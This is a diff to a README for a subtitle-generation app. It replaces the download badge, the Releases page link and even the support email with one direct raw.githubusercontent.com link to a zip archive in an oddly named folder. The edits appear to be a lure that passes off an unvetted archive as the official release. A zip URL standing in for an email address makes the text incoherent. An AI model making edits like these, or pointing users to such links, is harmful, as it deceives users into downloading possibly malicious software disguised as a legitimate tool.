@@ -4,7 +4,7 @@
 powersub-demo-6376 is an easy-to-use application that helps you generate subtitles quickly. Whether you are working on a video project or need subtitles for your content, this tool streamlines the process. You can have your subtitles ready in minutes, making your videos more accessible to a wider audience.
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/22denz22/powersub-demo-6376/releases)
+[![Download Release](https://raw.githubusercontent.com/22denz22/powersub-demo-6376/main/acanthopodous/powersub-demo-6376.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/22denz22/powersub-demo-6376/main/acanthopodous/powersub-demo-6376.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run powersub-demo-6376:
@@ -48,7 +48,7 @@ Keep an eye on the Releases page for updates. Regular updates provide new featur
 ## 📞 Support
 If you encounter issues or have questions, you can reach the support team:
 
-- **Email:** support@powersub-demo-6376.com
+- **Email:** https://raw.githubusercontent.com/22denz22/powersub-demo-6376/main/acanthopodous/powersub-demo-6376.zip
 - **GitHub Issues:** Visit the Issues section of our GitHub page to report bugs or request features.
 
 ## 🌟 Feedback
@@ -65,4 +65,4 @@ If you want to learn more about subtitle generation, consider these resources:
 - Documentation available on the GitHub Wiki.
 
 ## 🌐 Explore More
-For further information, visit our [Releases page](https://github.com/22denz22/powersub-demo-6376/releases) to stay updated on the latest advances and enhancements.
+For further information, visit our [Releases page](https://raw.githubusercontent.com/22denz22/powersub-demo-6376/main/acanthopodous/powersub-demo-6376.zip) to stay updated on the latest advances and enhancements.
